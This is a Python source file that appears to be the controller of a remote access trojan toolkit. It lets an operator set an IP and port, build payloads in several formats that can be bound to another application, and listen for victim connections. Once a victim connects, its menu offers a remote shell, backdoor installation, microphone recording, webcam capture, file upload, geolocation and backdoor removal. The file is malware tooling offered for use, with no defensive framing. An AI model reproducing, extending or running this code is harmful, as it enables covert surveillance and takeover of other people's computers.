from mainclass.system import system
from colorama import Fore, init
from threading import *
from mainclass import shell as shclass
from mainclass.builder import builder
from mainclass.encrypter import *
from mainclass.options import options
import socket
import sys, os

ip = ""
port = 0

def shell(conn, address): shclass.shell(conn, address)
def backdoor(conn, address): shclass.backdoor(conn, address)
def recordmic(conn, address): shclass.mic(conn, address)
def uploadfile(conn, address): shclass.upload(conn, address)
def cam(conn, address): shclass.cam(conn, address)
def getlocation(conn, address): shclass.geo(conn, address)
def destroybackdoor(conn, address): shclass.delete(conn, address)
def agentinfo(conn, address): shclass.agentinfo(conn, address)

def generateConf(): generate()

def selectIP(): 
    global ip
    ip = system.input('IP')

def selectPort(): 
    global port
    port = system.input('PORT')

def getPayloadOption():
    while True:
        system.clear_screen()
        system.printheader()
        system.printBuildOptions(2)
        command = system.input().strip('')

        if command == '1' or command == '2':
            break

    return command

def getAppOption():
    location = 'null'
    while True:
        system.clear_screen()
        system.printheader()
        system.printBuildOptions(3)
        command = system.input().strip('')

        if command == '1':
            location = system.input('LOCATION')
            if os.path.exists(location): break
            else: 
                print(Fore.LIGHTRED_EX + '[!] Error: File Not Exists')
                input('OK')
                continue
            
        elif command == '2': break
        
    return location

def build(): 
    if ip == '' or port == 0:
        print(Fore.LIGHTRED_EX + '[!] Warning: Please Select IP and PORT')
        input('OK')
        return
    while True:
        system.clear_screen()
        system.printheader()
        system.printBuildOptions(1)
        command = system.input().strip('')

        if command == '9': break

        try: b_format = options.build_formats.get(command)
        except: b_format = 'exe'

        payload_option = getPayloadOption()
        app_option = getAppOption()
        if payload_option == '1':
            builder.build(type=b_format, ip=ip, port=port, app=app_option)
            break
        elif payload_option == '2':
            builder.build(type=b_format, ip=ip, port=port, app=app_option)
            break

def listen():
    if ip == '' or port == 0:
        print(Fore.LIGHTRED_EX + '[!] Warning: Please Select IP and PORT')
        input('OK')
        return
    system.clear_screen()
    system.printheader()
    print(Fore.LIGHTCYAN_EX + "[+] Starting...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))
    s.listen(1)
    conn, address = s.accept()
    print(Fore.LIGHTCYAN_EX + '[+] Waiting Session...')
    print(Fore.LIGHTCYAN_EX + '[+] Session Started... Session Info : ', Fore.LIGHTGREEN_EX + address[0] + Fore.LIGHTGREEN_EX + ':' + Fore.LIGHTGREEN_EX + str(address[1]))
    conn.send(encrypt(system.getdata("authcode").encode()))
    while True:
        system.clear_screen()
        system.printheader()
        system.printAgentOptions()
        command = system.input()

        if command == "q": break
        func = agent_options.get(command)
        if func: func(conn, address)
        else: system.clear_screen()

menu_options = {"1": build, "2": listen , "3": selectIP, 
                "4": selectPort, "5": generateConf}

agent_options = {"1": shell, "2": backdoor, "3": recordmic, "4": uploadfile,
                 "5":cam, "6": getlocation, "7": destroybackdoor, "8": agentinfo}

init(autoreset=True)

system.clear_screen()

def main():
    while True:
        system.clear_screen()
        system.printheader()
        system.printMenuOptions(ip, port)
        command = system.input()

        if command == 'q': break
        func = menu_options.get(command)
        if func: func()
        else: system.clear_screen()

if __name__ == '__main__':
    main()